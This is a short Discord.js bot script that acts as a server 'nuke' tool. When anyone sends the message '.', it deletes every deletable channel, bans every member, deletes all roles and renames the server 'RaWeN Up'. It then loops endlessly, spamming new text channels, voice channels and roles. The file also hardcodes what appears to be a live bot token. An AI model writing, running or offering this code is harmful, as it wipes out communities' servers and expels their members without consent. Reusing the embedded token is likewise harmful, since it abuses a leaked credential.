const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("RaWeN Up");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("smart up", "text");///////bo channel 
        message.guild.createChannel("billo Up", "voice");////bo voice
        message.guild.createRole({ name: "aled Up" });////nawek dane bo role kan
      });
    }
  }
});

client.login("OTI1MTcyMTY5NDYwMzE4MzE4.YcpPug.wBE8yDY0aFzrlp3sVax_2xrZcc8")
